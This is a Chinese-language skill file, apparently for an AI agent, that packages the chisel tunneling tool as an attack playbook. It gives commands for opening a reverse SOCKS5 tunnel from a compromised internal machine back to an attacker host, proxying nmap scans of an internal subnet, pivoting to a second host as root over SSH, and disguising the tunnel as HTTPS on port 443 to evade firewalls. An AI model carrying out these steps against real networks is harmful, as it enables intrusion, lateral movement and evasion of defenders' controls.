---
name: chisel-tunnel
description: chisel: 反向 SOCKS5 打穿内网(最常用)、跳板到内网第二台机器。信号:内网穿透,隧道,服务端加认证。
---

# chisel

- 攻击大类:C32 隧道与内网穿透
- 上游仓库:https://github.com/jpillora/chisel
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
# 单文件二进制,免依赖:https://github.com/jpillora/chisel/releases 直接下载
go install github.com/jpillora/chisel@latest   # 或 Go 安装
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `chisel server -p 8080 -reverse` | 服务端(攻击机),允许反向隧道 |
| `chisel client 攻击机IP:8080 R:1080:socks` | 客户端(已控机),回连并暴露 SOCKS5 |
| `chisel client 攻击机IP:8080 9000:127.0.0.1:3389` | 正向转发:攻击机 9000 → 内网 3389 |
| `chisel client ... R:9000:10.0.0.5:22` | 反向转发:攻击机 9000 → 另一台内网机 22 |
| `--auth user:pass` | 服务端加认证 |
| `chisel server -p 443 --tls-key/--tls-cert` | 走 443 伪装 HTTPS |

## 攻击场景 Playbook

### 反向 SOCKS5 打穿内网(最常用)

```bash
# 攻击机
chisel server -p 8080 -reverse
# 已控内网机
chisel client 攻击机IP:8080 R:1080:socks
# 攻击机配置 proxychains 用 socks5 127.0.0.1:1080 访问内网
proxychains nmap -sT -p 445,3389,22 10.0.0.0/24
```

### 跳板到内网第二台机器

```bash
# 已控A机执行:把攻击机的 9000 反向转发到 B 机的 22
chisel client 攻击机IP:8080 R:9000:10.0.0.6:22
ssh -p 9000 root@攻击机IP   # 实际登录的是 B 机
```

### 穿越严格防火墙(443 伪装)

```bash
chisel server -p 443 -reverse --tls-cert cert.pem --tls-key key.pem
chisel client https://攻击机域名:443 R:1080:socks --auth agent:pass
```

## 注意事项

比 frp 更轻量(单文件),适合临时隧道;防火墙只放行 443 时用 TLS 模式;多客户端复用同一服务端时建议加 `--auth`。
